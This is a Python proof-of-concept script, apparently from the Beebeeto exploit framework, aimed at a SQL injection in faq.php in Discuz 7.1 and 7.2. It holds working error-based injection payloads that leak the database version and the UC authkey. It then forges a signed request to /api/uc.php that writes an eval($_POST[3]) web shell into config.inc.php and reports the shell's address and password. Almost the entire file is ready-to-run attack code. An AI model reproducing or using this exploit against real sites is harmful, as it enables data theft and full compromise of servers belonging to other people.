#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import math
import time
import urllib2
import urllib
import hashlib, base64

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0003',# 由Beebeeto官方编辑
            'name': 'Discuz7.2 /faq.php sql注入漏洞 POC',  # 名称
            'author': 'windows95',  # 作者
            'create_date': '2014-07-28',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer3_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',  # 漏洞所涉及的应用名称
            'vul_version': ['7.1', '7.2'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['Discuz!', 'faq.php', 'sql injection'],  # 漏洞相关tag
            'desc': 'Discuz 7.1 or 7.2 has sql injection in faq.php.',  # 漏洞描述
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-066095',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23"
        attack_url = args['options']['target'] + '/faq.php'
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
            print '[*] Post Data: ' + payload
        request = urllib2.Request(attack_url, payload)
        response = urllib2.urlopen(request)
        content = response.read()
        reg = re.compile('Duplicate entry (.*?) for key')
        res = reg.findall(content)
        if res:
            args['success'] = True
            if args['options']['verbose']:
                print '[*] GET DATA: ' + res[0]
            return args
        else:
            args['success'] = False
            return args

    @classmethod
    def get_shell(cls, url, key, host):
        headers = {'Accept-Language': 'zh-cn',
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)',
                   'Referer': url
        }
        url = url + '/api/uc.php'
        tm = time.time() + 10 * 3600
        tm = "time=%d&action=updateapps" % tm
        code = urllib.quote(cls.get_authcode(tm, key))
        url = url + "?code=" + code
        data1 = '''<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://xxx\');eval($_POST[3]);//</item>
            </root>'''
        req = urllib2.Request(url, data=data1, headers=headers)
        ret = urllib2.urlopen(req)

        data2 = '''<?xml version="1.0" encoding="ISO-8859-1"?>
            <root>
            <item id="UC_API">http://aaa</item>
            </root>'''
        req = urllib2.Request(url, data=data2, headers=headers)
        ret = urllib2.urlopen(req)

        req = urllib2.Request(host + '/config.inc.php')
        res = urllib2.urlopen(req, timeout=20).read()

    @staticmethod
    def microtime(get_as_float=False):
        if get_as_float:
            return time.time()
        else:
            return '%.8f %d' % math.modf(time.time())

    @classmethod
    def get_authcode(cls, string, key=''):
        ckey_length = 4;
        key = hashlib.md5(key).hexdigest();
        keya = hashlib.md5(key[0:16]).hexdigest();
        keyb = hashlib.md5(key[16:32]).hexdigest();
        keyc = (hashlib.md5(cls.microtime()).hexdigest())[-ckey_length:];
        cryptkey = keya + hashlib.md5(keya + keyc).hexdigest();
        key_length = len(cryptkey);
        string = '0000000000' + (hashlib.md5(string + keyb)).hexdigest()[0:16] + string;
        string_length = len(string);
        result = '';
        box = range(0, 256);
        rndkey = dict();
        for i in range(0, 256):
            rndkey[i] = ord(cryptkey[i % key_length]);
        j = 0;
        for i in range(0, 256):
            j = (j + box[i] + rndkey[i]) % 256;
            tmp = box[i];
            box[i] = box[j];
            box[j] = tmp;
        a = 0;
        j = 0;
        for i in range(0, string_length):
            a = (a + 1) % 256;
            j = (j + box[a]) % 256;
            tmp = box[a];
            box[a] = box[j];
            box[j] = tmp;
            result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))
        return keyc + base64.b64encode(result).replace('=', '')

    @classmethod
    def exploit(cls, args):
        payload = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x5E,(select substr(authkey,1,31) from cdb_uc_applications limit 0,1))x from information_schema.tables group by x)a)%23"
        payload1 = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x5E,(select substr(authkey,32,64) from cdb_uc_applications limit 0,1))x from information_schema.tables group by x)a)%23"

        attack_url = args['options']['target'] + '/faq.php'
        if args['options']['verbose']:
            print '[*] Request URL: ' + attack_url
            print '[*] Post Data: ' + payload +'\n'+ payload1
        request = urllib2.Request(attack_url, payload)
        response = urllib2.urlopen(request)
        content = response.read()
        reg = re.compile('Duplicate entry \'1\^(.*?)\' for key')
        res = reg.findall(content)
        request1 = urllib2.Request(attack_url, payload1)
        response1 = urllib2.urlopen(request1)
        content1 = response1.read()
        res1 = reg.findall(content1)
        if res and res1:
            uc_key = res[0] + res1[0]
            if args['options']['verbose']:
                print '[*] UC KEY is ' + uc_key
            cls.get_shell(args['options']['target'], uc_key, args['options']['target'])
            args['success'] = True
            args['result']['webshell'] = args['options']['target'] + '/config.inc.php'
            args['result']['shell password'] = '3'
            return args
        else:
            args['success'] = False
            return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
